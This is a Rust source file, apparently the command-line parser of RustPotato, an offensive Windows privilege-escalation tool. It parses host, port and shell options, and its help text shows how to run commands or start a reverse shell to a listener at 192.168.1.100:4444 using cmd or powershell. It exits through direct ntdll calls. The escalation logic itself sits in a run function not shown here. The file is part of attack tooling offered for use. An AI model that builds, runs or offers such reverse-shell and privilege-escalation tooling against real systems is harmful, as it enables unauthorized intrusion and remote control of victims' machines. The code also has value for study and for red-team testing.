use crate::{
    _print, run,
    win32::ntdll::{nt_current_process, ntdll},
};

pub fn parse_args() {
    // Get the command-line arguments
    let args: Vec<String> = std::env::args().collect();

    // Ensure there are enough arguments
    if args.len() < 2 {
        _print!(
            "Usage: {} <cmdline> OR -h <host> -p <port> [-c <cmd>]",
            args[0]
        );
        std::process::exit(1);
    }

    // Parse arguments based on the format
    if args[1].starts_with("-") {
        // Parse the key-value options
        let mut host: Option<String> = None;
        let mut port: Option<u16> = None;
        let mut command: Option<String> = None;

        let mut i = 1;
        while i < args.len() {
            match args[i].as_str() {
                "-h" => {
                    if i + 1 < args.len() {
                        host = Some(args[i + 1].clone());
                        i += 1;
                    } else {
                        _print!("[-] Error: Missing value for -h");
                        unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
                    }
                }
                "-p" => {
                    if i + 1 < args.len() {
                        match args[i + 1].parse::<u16>() {
                            Ok(p) => port = Some(p),
                            Err(_) => {
                                _print!("[-] Error: Invalid port value");
                                unsafe {
                                    ntdll().nt_terminate_process.run(nt_current_process(), 1)
                                };
                            }
                        }
                        i += 1;
                    } else {
                        _print!("[-] Error: Missing value for -p");
                        unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
                    }
                }
                "-c" => {
                    if i + 1 < args.len() {
                        command = Some(args[i + 1].clone());
                        i += 1;
                    } else {
                        _print!("[-] Error: Missing value for -c");
                        unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
                    }
                }
                "--help" => {
                    _print!(
                        r#"
Usage:
    RustPotato.exe <cmdline> OR -h <host> -p <port> [-c <cmd>]

Description:
    Execute a command line or start a reverse shell.

Options:
    -h <LHOST>         Specify the IP address of the listener.
    -p <LPORT>         Specify the port of the listener.
    -c <cmd|powershell>
                        Specify the shell to be used in the reverse shell (optional, default is cmd).

Examples:
    Execute a command line:
    RustPotato.exe "cmd.exe /c whoami"

    Start a reverse shell with the default shell (cmd):
    RustPotato.exe -h 192.168.1.100 -p 4444

    Start a reverse shell with powershell:
    RustPotato.exe -h 192.168.1.100 -p 4444 -c powershell
                "#,
                    );
                    unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 0) };
                }
                _ => {
                    _print!("[-] Error: Unknown option {}", args[i]);
                    unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
                }
            }
            i += 1;
        }

        // Validate required arguments
        if host.is_none() || port.is_none() {
            _print!("[-] Error: Both -h and -p are required.");
            unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
        }

        // Run with parsed options
        run(
            &command.unwrap_or_else(|| "cmd".to_string()), // Default to "cmd" if -c is not provided
            Some(host.unwrap().as_str()),
            port,
        );
    } else {
        // Handle the single string argument
        let input_arg = &args[1];

        if input_arg.is_empty() {
            _print!("[-] Error: The argument cannot be an empty string.");
            unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
        }

        // Run with the provided command-line string
        run(input_arg, None, None);
    }
}
